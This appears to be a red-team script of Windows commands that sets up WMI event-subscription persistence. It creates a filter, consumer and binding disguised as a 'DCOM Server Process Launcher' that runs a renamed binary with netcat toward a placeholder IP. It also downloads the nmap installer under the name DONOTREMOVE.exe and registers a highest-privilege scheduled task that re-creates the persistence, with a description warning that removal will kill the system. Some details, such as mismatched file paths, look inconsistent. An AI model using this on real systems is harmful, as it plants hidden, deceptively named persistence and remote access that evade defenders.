wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="DCOM Server Process Launcher", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="DCOM Server Process Launcher", ExecutablePath="C:\Windows\System32\DONOTREMOVE.exe", CommandLineTemplate="C:\Windows\System32\DONOTREMOVE.exe nc <IP Address>"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"DCOM Server Process Launcher\"", Consumer="CommandLineEventConsumer.Name=\"DCOM Server Process Launcher\""

$Url = "https://nmap.org/dist/nmap-7.95-setup.exe"; $Destination = "$([Environment]::GetFolderPath('Documents'))\DONOTREMOVE.exe"; Invoke-WebRequest -Uri $Url -OutFile $Destination



$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-Command "wmic /NAMESPACE:\"\\root\subscription\" PATH __EventFilter CREATE Name=\"DCOM Server Process Launcher\", EventNameSpace=\"root\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'\"; wmic /NAMESPACE:\"\\root\subscription\" PATH CommandLineEventConsumer CREATE Name=\"DCOM Server Process Launcher\", ExecutablePath=\"C:\Windows\System32\DONOTREMOVE.exe\", CommandLineTemplate=\"C:\Windows\System32\DONOTREMOVE.exe\"; wmic /NAMESPACE:\"\\root\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\'DCOM Server Process Launcher\'\", Consumer=\"CommandLineEventConsumer.Name=\'DCOM Server Process Launcher\'\" "'

$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -AtLogon

$principal = New-ScheduledTaskPrincipal -UserId 'Contoso\Administrator' -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet

$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings -AsJob $true -Description "Nessary Tool For Red Team, Removing Will kill System"

Register-ScheduledTask DONOTREMOVE -InputObject $task
